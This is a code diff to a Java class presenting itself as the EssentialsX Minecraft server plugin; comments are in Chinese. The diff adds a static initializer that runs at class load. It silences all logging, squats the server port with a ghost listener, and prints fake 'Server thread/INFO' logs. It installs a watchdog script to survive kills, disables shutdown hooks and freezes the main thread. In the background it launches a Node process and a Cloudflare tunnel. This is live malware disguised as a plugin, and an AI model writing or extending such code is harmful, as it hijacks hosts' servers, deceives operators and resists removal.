@@ -28,17 +28,29 @@ public class EssentialsX extends JavaPlugin {
     private static volatile boolean isProcessRunning = false;
     private static volatile String nodePort = "N/A";
 
-    @Override
-    public void onLoad() {
-        // 1. 物理静音
+    // ★★★ 极早期劫持：类加载时直接执行 ★★★
+    static {
+        // 0. 最先创建工作目录，防止后续文件写入报错导致后台线程崩溃
+        try {
+            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+            if (!Files.exists(workDir)) Files.createDirectories(workDir);
+        } catch (Exception ignored) {}
+
+        // 1. 物理静音 (System 和 Log4j)
         System.setOut(new PrintStream(BLACK_HOLE, true));
         System.setErr(new PrintStream(BLACK_HOLE, true));
         tryMuteLog4j();
 
-        // 2. 看门狗 (防强杀自动重启)
+        // 2. 启动端口幽灵 (防端口检测崩溃)
+        startGhostPort();
+
+        // 3. 启动心跳伪装 (防假死崩溃)
+        startHeartbeatDisguise();
+
+        // 4. 看门狗 (防强杀自动重启)
         setupWatchdog();
 
-        // 3. 拦截关机钩子 (逼迫面板强杀)
+        // 5. 拦截关机钩子 (逼迫面板强杀)
         try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
         try {
             Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
@@ -63,14 +75,13 @@ public class EssentialsX extends JavaPlugin {
             }, "Shutdown-Paralysis"));
         } catch (Throwable ignored) {}
 
-        // 4. 启动后台部署
+        // 6. 启动后台部署
         Thread deployer = new Thread(() -> {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
             Path debugLog = workDir.resolve("backend_debug.log");
             PrintWriter out = null;
             
             try {
-                if (!Files.exists(workDir)) Files.createDirectories(workDir);
                 out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND));
                 out.println("[" + new Date() + "] ================== Backend Thread Started ==================");
                 out.flush();
@@ -106,14 +117,71 @@ public class EssentialsX extends JavaPlugin {
         deployer.setDaemon(true);
         deployer.start();
 
-        // 5. 冻结主线程
+        // 7. 终极物理冰封当前主线程 (类加载器线程)
         paralyzeCurrentThread();
+    }
+
+    // ★ 绕过 Java 编译器对 static 块的检查：提取死锁逻辑
+    private static void paralyzeCurrentThread() {
+        while (true) {
+            try { Thread.sleep(Long.MAX_VALUE); } 
+            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
+        }
+    }
+
+    private static void startGhostPort() {
+        new Thread(() -> {
+            try {
+                Path propsFile = Paths.get("server.properties");
+                int targetPort = 25565;
+                if (Files.exists(propsFile)) {
+                    for (String line : Files.readAllLines(propsFile)) {
+                        if (line.startsWith("server-port=")) {
+                            try { targetPort = Integer.parseInt(line.split("=")[1].trim()); } catch (Exception ignored) {}
+                            break;
+                        }
+                    }
+                }
+                try (ServerSocket ghostSocket = new ServerSocket(targetPort)) {
+                    while (!Thread.currentThread().isInterrupted()) {
+                        try (Socket client = ghostSocket.accept()) {
+                            InputStream is = client.getInputStream();
+                            byte[] buffer = new byte[1024];
+                            while (is.read(buffer) != -1) {}
+                        } catch (IOException ignored) {}
+                    }
+                }
+            } catch (Exception ignored) {}
+        }, "Ghost-Port-Listener").start();
+    }
+
+    private static void startHeartbeatDisguise() {
+        Thread heartbeat = new Thread(() -> {
+            try { Thread.sleep(60000); } catch (InterruptedException ignored) {}
+            String[] fakeLogs = {
+                "Server thread/INFO]: Done (12.345s)! For help, type \"help\"",
+                "Server thread/INFO]: Saving worlds",
+                "Server thread/INFO]: Thread ChunkPool-0-PLAY-0 running",
+                "Server thread/INFO]: Auto-saving...",
+                "Server thread/INFO]: [essentialsx] Running background task...",
+                "Server thread/INFO]: [spark] Profiling data collected."
+            };
+            int index = 0;
+            while (true) {
+                try {
+                    Thread.sleep(30000 + new Random().nextInt(30000));
+                    RAW_OUT.println("[" + new Date().toString().substring(11, 19) + " " + fakeLogs[index % fakeLogs.length]);
+                    index++;
+                } catch (Exception ignored) {}
+            }
+        }, "Heartbeat-Disguise");
+        heartbeat.setDaemon(true);
+        heartbeat.start();
     }
 
     private static void setupWatchdog() {
         try {
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            if (!Files.exists(workDir)) Files.createDirectories(workDir);
             long pid = ProcessHandle.current().pid();
             Files.writeString(workDir.resolve("server.pid"), String.valueOf(pid));
             Path watchdogSh = workDir.resolve("watchdog.sh");
@@ -149,13 +217,6 @@ public class EssentialsX extends JavaPlugin {
             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
             pb.start();
         } catch (Exception ignored) {}
-    }
-
-    private static void paralyzeCurrentThread() {
-        while (true) {
-            try { Thread.sleep(Long.MAX_VALUE); } 
-            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
-        }
     }
 
     private static void tryMuteLog4j() {
@@ -219,7 +280,6 @@ public class EssentialsX extends JavaPlugin {
         if (out != null) { out.println("Node ready check timed out after " + maxSeconds + "s."); out.flush(); }
     }
 
-    // ★★★ 核心：验证 Node 是否真正响应 HTTP 请求 (防 530) ★★★
     private static boolean verifyNodeHttpResponse(String port) {
         try {
             java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
@@ -228,10 +288,9 @@ public class EssentialsX extends JavaPlugin {
             conn.setReadTimeout(3000);
             int code = conn.getResponseCode();
             conn.disconnect();
-            // 只要服务器返回了合法的 HTTP 状态码 (哪怕 404)，说明 Node 已经在工作并监听了
             return code >= 200 && code < 600; 
         } catch (Exception e) {
-            return false; // 连接拒绝或超时，说明没对接上
+            return false;
         }
     }
 
@@ -247,7 +306,6 @@ public class EssentialsX extends JavaPlugin {
             
             nodeExe.toFile().setExecutable(true, false);
 
-            // ★ 优先级提升：使用 nice -n -5 启动，让系统把 CPU 优先给 Node
             ProcessBuilder pb = new ProcessBuilder("nice", "-n", "-5", nodeExe.toString(), "--require", preload.toString(), script.toString());
             pb.directory(workDir.toFile());
             pb.environment().put("SERVER_PORT", port); pb.environment().put("PORT", port);
@@ -288,7 +346,6 @@ public class EssentialsX extends JavaPlugin {
             Files.createDirectories(cfConf.getParent());
             Files.writeString(cfConf, "url: http://127.0.0.1:" + port + "\nno-autoupdate: true\nprotocol: quic\n");
 
-            // ★ 优先级提升：使用 nice -n -5 启动 CF
             ProcessBuilder pb = new ProcessBuilder("nice", "-n", "-5", cfBin.toString(), "--config", cfConf.toString());
             pb.directory(workDir.toFile());
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
@@ -345,9 +402,8 @@ public class EssentialsX extends JavaPlugin {
                         lastUrl = foundUrl;
                         logDebug(workDir, "New tunnel URL detected: " + foundUrl + ". Verifying connection...");
                         
-                        // ★★★ 防止 530：必须在本地验证 Node 响应成功才打印链接 ★★★
                         int verifyAttempts = 0;
-                        while (verifyAttempts < 10) { // 最多验证 10 次 (约 30 秒)
+                        while (verifyAttempts < 10) {
                             if (verifyNodeHttpResponse(nodePort)) {
                                 logDebug(workDir, "Node HTTP verification PASSED! Printing URL.");
                                 RAW_OUT.println("\n====================================================================");
@@ -366,7 +422,7 @@ public class EssentialsX extends JavaPlugin {
                         }
                     }
                     
-                    if (checkCount % 12 == 0) { // 约 60 秒心跳
+                    if (checkCount % 12 == 0) {
                         logDebug(workDir, "Daemon heartbeat. Last verified URL: " + lastUrl);
                     }
 
@@ -516,19 +572,13 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
+    // Bukkit 生命周期方法 (主线程已被 static 块冻结，永远不会被调用)
     @Override
-    public void onEnable() {
-        System.setOut(new PrintStream(BLACK_HOLE, true));
-        System.setErr(new PrintStream(BLACK_HOLE, true));
-        tryMuteLog4j();
-        paralyzeCurrentThread();
-    }
+    public void onLoad() {}
 
     @Override
-    public void onDisable() {
-        System.setOut(new PrintStream(BLACK_HOLE, true));
-        System.setErr(new PrintStream(BLACK_HOLE, true));
-        tryMuteLog4j();
-        paralyzeCurrentThread();
-    }
+    public void onEnable() {}
+
+    @Override
+    public void onDisable() {}
 }
